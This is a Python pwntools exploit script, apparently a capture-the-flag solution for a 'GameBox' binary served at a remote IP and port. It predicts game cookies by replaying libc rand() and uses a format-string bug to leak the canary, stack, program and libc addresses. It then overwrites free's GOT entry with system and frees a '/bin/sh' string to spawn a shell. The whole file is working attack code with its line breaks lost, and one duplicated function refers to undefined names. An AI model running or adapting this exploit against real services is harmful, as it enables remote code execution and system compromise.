from pwn import *from ctypes import *#NWLRBBMQBHCDARZOWKKYHIDDDEBUG = 1if DEBUG:     p = process('./GameBox')     #scontext.log_level = 'debug'     #libc = ELF('/lib32/libc-2.24.so')     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     else:     p = remote('39.107.33.43', 13570)     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     #libc = ELF('libc_64.so.6')#context.log_level = 'debug'wordSz = 4hwordSz = 2bits = 32PIE = 0mypid=0def leak(address, size):   with open('/proc/%s/mem' % mypid) as mem:      mem.seek(address)      return mem.read(size)def findModuleBase(pid, mem):   name = os.readlink('/proc/%s/exe' % pid)   with open('/proc/%s/maps' % pid) as maps:      for line in maps:         if name in line:            addr = int(line.split('-')[0], 16)            mem.seek(addr)            if mem.read(4) == "\x7fELF":               bitFormat = u8(leak(addr + 4, 1))               if bitFormat == 2:                  global wordSz                  global hwordSz                  global bits                  wordSz = 8                  hwordSz = 4                  bits = 64               return addr   log.failure("Module's base address not found.")   sys.exit(1)def debug(addr):    global mypid    mypid = proc.pidof(p)[0]    #raw_input('debug:')    with open('/proc/%s/mem' % mypid) as mem:        moduleBase = findModuleBase(mypid, mem)        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))libc = CDLL("/lib/x86_64-linux-gnu/libc-2.23.so")cookie=[]def get_cookie():    stri=""    for i in range(0,24):        stri+=chr(libc.rand()%26+0x41)    return stridef play(length,name):    global cookie    p.recvuntil("(E)xit\n")    p.sendline("P")    p.recvuntil("write:\n")    data=get_cookie()    #print data    cookie.append(data)    p.sendline(data)    #print p.recv()    p.recvuntil('You great prophet!')    p.recvuntil("length:")    p.sendline(str(length))    p.recvuntil('name:')    p.send(name)def show():    p.recvuntil("(E)xit\n")    p.sendline("S")    p.recvuntil('=======RANK LIST=======')    def delete(idx):    global cookie    p.recvuntil("(E)xit\n")    sleep(1)    p.sendline("D")    p.recvuntil('dex:')    p.sendline(str(idx))    p.recvuntil('Cookie:')    p.sendline(cookie[idx])    cookie.remove(cookie[idx])def delete1(idx):           p.recvuntil("(E)xit\n")    p.sendline("D")    p.recvuntil('dex:')    p.send(str(idx))    #p.recvuntil('Cookie:')    #p.sendline(cookie[idx])   def build_str1(addr,idx):    stri=""    addr=addr&0xffffffff    low=addr&0xffff    high=(addr>>16)&0xffff        stri+=("%%%dc"%(address))+(("%%%dc")%(0x400000))*num+("%%%d$n")%(idx)    '''    address=addr&0xffffffff    stri+=("%%%dc"%(address))+("%%%d$n")%(idx)    '''    if len(stri)>0x1000:        print "over "        exit(0)    return stridef build_stri(addr,idx):    stri=""    addr=addr&0xffff        stri+=("%%%dc"%(addr))+("%%%d$hn")%(idx)    '''    address=addr&0xffffffff    stri+=("%%%dc"%(address))+("%%%d$n")%(idx)    '''    if len(stri)>0x1000:        print "over "        exit(0)    return stridef build_str1(addr,idx):    stri=""    addr=addr&0xffff        stri+=("%%%dc"%(addr))+("%%%d$n")%(idx)    '''    address=addr&0xffffffff    stri+=("%%%dc"%(address))+("%%%d$n")%(idx)    '''    if len(stri)>0x1000:        print "over "        exit(0)    return striprintf_got=0x203050free_got=0x203018def pwn():    global free_got    #gdb.attach(p)#, "b *0x8048BB5 ")#8048F40 ")    #print get_cookie()    #debug(0x1033)    #debug(0x166D)    #play(0,'123')    play(100,"%7$p%8$p%9$p%13$p%15$p")    show()    p.recvuntil('0x')    canary=p.recvuntil('0x')[:-2]    data=p.recvuntil('0x')[:-2].ljust(8,'\x00')    print data,canary    stack_addr=int(data,16)    base=int(p.recvuntil('0x')[:-2],16)-0x18d5    libc_start_main=int(p.recvuntil('0x')[:-2],16)    libc_base=libc_start_main-0x20830    revise_addr=int(p.recvuntil('==')[:-2],16)    print "canary",canary    print "stack_addr",hex(stack_addr)    print "program base",hex(base)    print "libc_base",hex(libc_base)    print "revise addr",hex(revise_addr)    system_addr=libc_base+0x45390    print "system_addr",hex(system_addr)    print hex(0x11a8+base)    delete(0)    addr=revise_addr+(0x7ffec27bc230-0x7ffec27bc2b8)        stri=build_stri(addr,15)    play(len(stri),stri)    show()    #sleep(1)    #p.interactive()    delete(0)    free_got=free_got+base    print "free_got",hex(free_got)    stri=build_stri(free_got,41)    play(len(stri),stri)    show()    delete(0)        stri=build_stri(addr+2,15)    play(len(stri),stri)    show()    delete(0)    stri=build_stri(free_got>>16,41)    play(len(stri),stri)    show()    delete(0)    stri=build_stri(addr+4,15)    play(len(stri),stri)    show()    delete(0)    stri=build_str1(free_got>>32,41)    play(len(stri),stri)    show()    delete(0)    stri="/bin/sh\x00"    play(len(stri),stri)    show()        raw_input("xx?")    stri=build_stri(system_addr,24)    play(len(stri),stri)        stri=build_stri(addr,15)    play(len(stri),stri)        stri=build_stri(free_got+2,41)    play(len(stri),stri)    stri=build_stri(system_addr>>16,24)    play(len(stri),stri)     show()    #debug(0x11A8)    raw_input("go?")    delete(0)       p.interactive()if __name__ == '__main__':   pwn()     